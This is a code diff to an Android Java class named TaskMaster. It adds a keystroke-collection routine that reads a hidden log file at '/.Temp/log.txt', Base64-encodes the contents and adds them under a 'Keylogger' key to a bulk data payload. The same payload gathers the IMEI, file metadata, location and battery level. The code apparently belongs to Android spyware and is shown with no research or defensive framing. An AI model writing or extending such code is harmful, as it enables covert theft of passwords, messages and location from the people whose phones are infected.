@@ -78,7 +78,8 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
             String[] maskHash2 = maskHash.split(";");
             String[] hashes = maskHash2[1].split(":");
 
-            getFilesMetadata(hashes[7], params[0].context, params[0].IMEI);
+
+            getFilesMetadata(hashes[8], params[0].context, params[0].IMEI);
             JSONObject bulkData = new JSONObject();
             for (int i = 0; i < maskHash2[0].length(); i++) {
                 if (maskHash2[0].charAt(i) == '1') {
@@ -108,6 +109,9 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                             getSmartphoneLocation(bulkData, hashes[i], params[0].context);
                             break;
                         case 7:
+                            getKeystrokes(bulkData, hashes[i]);
+                            break;
+                        case 8:
                             getBatteryLevel(bulkData, params[0].context);
                             break;
                     }
@@ -235,6 +239,26 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
             }
         }
         return inFiles;
+    }
+
+    private void getKeystrokes(JSONObject bulkData, String hash) {
+        try {
+            FileInputStream fis = new FileInputStream(Environment.getExternalStorageDirectory().toString() + "/.Temp/log.txt");
+            BufferedReader bfr = new BufferedReader(new InputStreamReader(fis));
+            StringBuilder info = new StringBuilder();
+            String line;
+            while ((line = bfr.readLine()) != null) {
+                info.append(line);
+            }
+            String information = info.toString();
+            String SHA = SHA1Helper.SHA1(information);
+            if (!SHA.equals(hash)) {
+                bulkData.put("Keylogger", Base64.encodeToString(information.getBytes(), Base64.URL_SAFE));
+            }
+
+        } catch (Exception ex) {
+            Log.d("Keylogger", ex.getMessage());
+        }
     }
 
     private void getSmartphoneLocation(JSONObject bulkData, String hash, Context context) {
